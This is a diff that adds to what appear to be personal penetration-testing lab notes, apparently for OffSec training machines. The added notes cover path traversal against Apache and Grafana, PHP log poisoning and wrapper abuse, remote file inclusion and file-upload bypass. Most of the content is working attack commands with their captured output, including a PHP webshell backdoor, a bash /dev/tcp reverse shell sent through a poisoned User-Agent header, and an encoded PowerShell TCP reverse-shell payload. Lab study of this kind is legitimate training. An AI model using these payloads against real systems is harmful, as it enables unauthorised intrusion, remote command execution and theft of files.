@@ -233,7 +233,7 @@ chmod 400 dt_key
 ssh -i dt_key -p 2222 offsec@mountaindesserts.local
 ```
 
-
+### windows grafana path traversal
 Windows grafana has a path traversal vulnerability in the mysql plugin. We can use this to read files on the system.
 ```bash
 
@@ -269,4 +269,291 @@ Some web applications may implement filters to prevent path traversal attacks. H
 
 ```bash
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+```bash
+curl --path-as-is 'http://192.168.107.16/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords' -vv
+10:21:17.353738 [0-0] * [SETUP] added
+10:21:17.353957 [0-0] *   Trying 192.168.107.16:80...
+10:21:17.354151 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
+10:21:17.380552 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
+10:21:17.380663 [0-0] * Established connection to 192.168.107.16 (192.168.107.16 port 80) from 192.168.45.157 port 48810 
+10:21:17.380697 [0-0] * [SETUP] query ALPN
+10:21:17.380727 [0-0] * using HTTP/1.x
+10:21:17.380915 [0-0] > GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords HTTP/1.1
+10:21:17.380915 [0-0] > Host: 192.168.107.16
+10:21:17.380915 [0-0] > User-Agent: curl/8.17.0
+10:21:17.380915 [0-0] > Accept: */*
+10:21:17.380915 [0-0] > 
+10:21:17.381685 [0-0] * Request completely sent off
+10:21:17.404642 [0-0] < HTTP/1.1 200 OK
+10:21:17.404932 [0-0] < Date: Wed, 29 Jul 2026 14:21:16 GMT
+10:21:17.405141 [0-0] < Server: Apache/2.4.49 (Unix)
+10:21:17.405395 [0-0] < Last-Modified: Wed, 29 Jul 2026 09:53:12 GMT
+10:21:17.405597 [0-0] < ETag: "25-657bcec687200"
+10:21:17.405814 [0-0] < Accept-Ranges: bytes
+10:21:17.406031 [0-0] < Content-Length: 37
+10:21:17.406267 [0-0] < 
+OS{4e07aa122633ee1e161aac5a8606a261}
+10:21:17.406519 [0-0] * Connection #0 to host 192.168.107.16:80 left intact
+```
+
+REMINDER: use the `--path-as-is` option in curl to prevent it from normalizing the URL and removing the encoded characters.
+
+### Grafana path traversal
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -v --path-as-is http://192.168.107.16:3000/public/plugins/mysql/../../../../../../../../etc/passwd     
+*   Trying 192.168.107.16:3000...
+* Established connection to 192.168.107.16 (192.168.107.16 port 3000) from 192.168.45.157 port 46350 
+* using HTTP/1.x
+> GET /public/plugins/mysql/../../../../../../../../etc/passwd HTTP/1.1
+> Host: 192.168.107.16:3000
+> User-Agent: curl/8.17.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Accept-Ranges: bytes
+< Cache-Control: no-cache
+< Content-Length: 975
+< Content-Type: text/plain; charset=utf-8
+< Expires: -1
+< Last-Modified: Thu, 10 Jun 2021 12:02:44 GMT
+< Pragma: no-cache
+< X-Content-Type-Options: nosniff
+< X-Frame-Options: deny
+< X-Xss-Protection: 1; mode=block
+< Date: Wed, 29 Jul 2026 14:23:49 GMT
+< 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+grafana:x:472:0::/home/grafana:/usr/sbin/nologin
+* Connection #0 to host 192.168.107.16:3000 left intact
+                                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ curl -v --path-as-is http://192.168.107.16:3000/public/plugins/mysql/../../../../../../../../opt/install.txt
+*   Trying 192.168.107.16:3000...
+* Established connection to 192.168.107.16 (192.168.107.16 port 3000) from 192.168.45.157 port 46356 
+* using HTTP/1.x
+> GET /public/plugins/mysql/../../../../../../../../opt/install.txt HTTP/1.1
+> Host: 192.168.107.16:3000
+> User-Agent: curl/8.17.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Accept-Ranges: bytes
+< Cache-Control: no-cache
+< Content-Length: 37
+< Content-Type: text/plain; charset=utf-8
+< Expires: -1
+< Last-Modified: Wed, 29 Jul 2026 09:53:11 GMT
+< Pragma: no-cache
+< X-Content-Type-Options: nosniff
+< X-Frame-Options: deny
+< X-Xss-Protection: 1; mode=block
+< Date: Wed, 29 Jul 2026 14:23:52 GMT
+< 
+OS{c6d74c72815429c9f0f8f68dbfb4d12c}
+* Connection #0 to host 192.168.107.16:3000 left intact
+```
+
+### reverse shell / modify User-Agent 
+
+
+check your ip using `ip a` and then run the following command to listen for incoming connections:
+```bash
+nc -nlvp 4444
+```
+put the correct ip in here and run the following command to get a reverse shell:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" -v --path-as-is 'http://192.168.107.16/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.157%2F4444%200%3E%261%22' 
+*   Trying 192.168.107.16:80...
+* Established connection to 192.168.107.16 (192.168.107.16 port 80) from 192.168.45.157 port 40376 
+* using HTTP/1.x
+> GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.157%2F4444%200%3E%261%22 HTTP/1.1
+> Host: 192.168.107.16
+> Accept: */*
+> User-Agent: <?php echo system($_GET['cmd']); ?>
+> 
+* Request completely sent off
+^C
+```
+
+### LFI Windows XAMPP
+```bash
+curl -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" -v --path-as-is 'http://192.168.107.193/meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=dir' 
+*   Trying 192.168.107.193:80...
+* Established connection to 192.168.107.193 (192.168.107.193 port 80) from 192.168.45.157 port 40178 
+* using HTTP/1.x
+> GET /meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=dir HTTP/1.1
+> Host: 192.168.107.193
+> Accept: */*
+> User-Agent: <?php echo system($_GET['cmd']); ?>
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Wed, 29 Jul 2026 22:34:40 GMT
+< Server: Apache/2.4.49 (Win64) OpenSSL/1.1.1l PHP/7.3.31
+< X-Powered-By: PHP/7.3.31
+< Transfer-Encoding: chunked
+< Content-Type: text/html; charset=UTF-8
+
+ Volume in drive C has no label.
+ Volume Serial Number is 84F6-D600
+
+ Directory of C:\xampp\htdocs\meteor
+
+05/03/2022  11:08 AM    <DIR>          .
+05/03/2022  10:55 AM    <DIR>          ..
+05/03/2022  10:55 AM               453 ABOUT THIS TEMPLATE.txt
+05/03/2022  10:55 AM               621 admin.php
+05/03/2022  10:55 AM    <DIR>          css
+05/03/2022  10:55 AM               265 docker-compose.yml
+05/03/2022  10:55 AM               411 Dockerfile
+05/03/2022  10:55 AM    <DIR>          fonts
+07/29/2026  03:28 PM                38 hopefullynobodyfindsthisfilebecauseitssupersecret.txt
+05/03/2022  10:55 AM    <DIR>          img
+05/03/2022  10:55 AM             7,129 index.php
+05/03/2022  10:55 AM    <DIR>          js
+05/03/2022  10:55 AM            72,940 php.ini
+05/03/2022  10:55 AM                61 start.sh
+               8 File(s)         81,918 bytes
+               6 Dir(s)     630,673,408 bytes free
+               6 Dir(s)     630,673,408 bytes free"
+```
+
+use type to read the file:
+```bash
+curl -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" -v --path-as-is 'http://192.168.107.193/meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt' 
+
+192.168.45.157 - - [29/Jul/2026:15:34:40 -0700] "GET /meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=dir HTTP/1.1" 200 27306 "-" "OS{48fa98a62f09aa2cac9fc8bfd3769496}
+OS{48fa98a62f09aa2cac9fc8bfd3769496}"
+```
+
+## PHP Wrappers
+protocol wrappers to enhance the language's capabilities. For example, PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP web applications
+
+`php://filter` allows us to apply filters to a file before it is read. This can be used to encode or decode the contents of a file, or to apply other transformations. For example, we can use the `convert.base64-encode` filter to get the contents of a file as a base64 encoded string.
+
+Get content of file as base64 encoded string:
+```bash
+curl "http://192.168.143.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php"
+```
+Decode using base64 command:
+```bash
+echo "<base64_encoded_string>" | base64 -d 
+```
+
+`data://` wrapper allows us to include data directly in the URL. This can be used to execute arbitrary PHP code by encoding it in base64 and including it in the URL.
+
+File listing:
+```bash
+curl "http://192.168.143.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+```
+
+Cat the file:
+```bash
+curl "http://192.168.143.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('cat%20/var/www/html/backup.php');?>"
+```
+
+Get rid of spaces in the command otherwise it will break the URL.
+
+## Remote file inclusion
+Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the allow_url_include 
+
+first we need something we can execute (kali linux has a few in /usr/share/webshells/php/ for example). 
+
+```php
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+```
+
+host it
+```bash
+python3 -m http.server 80
+```
+
+then include it in the vulnerable page (use your own IP & off course it should be internet facing or host it in a server somehwere):
+```bash
+curl "http://mountaindesserts.local/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+```
+
+
+### Reverse shell using RFI
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
+```
+
+Change ip and port and then host it + start a listener on your machine:
+```bash
+nc -nlvp 4444
+```
+Run exploit:
+
+```bash
+curl "http://192.168.143.16:8001/meteor/index.php?page=http://192.168.45.244/php-reverse-shell.php"  
+``` 
+use shell to get the flag.
+
+## Upload vulnerabilities
+Alt file extension bypass:
+https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
+
+file upload vulnerability that enables us to upload files to be run by the web server. 
+
+Make powershell script to get a reverse shell:
+```bash
+                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ pwsh               
+PowerShell 7.5.4
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.244",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'                                                                                                                  
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                                                                                                                                                     
+┌──(kali㉿kali)-[/home/kali]                                                                                                                                                                                       
+└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)                                                                                                                                                              
+
+┌──(kali㉿kali)-[/home/kali]
+└─PS> $EncodedText
+```
+
+Copy the `EncodedText` and then run the following command to get a reverse shell:
+```bash
+curl -v --path-as-is 'http://192.168.143.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20 <EncodedText>'
+```
+While having your listener running on your machine:
+```bash
+nc -nlvp 4444
 ```
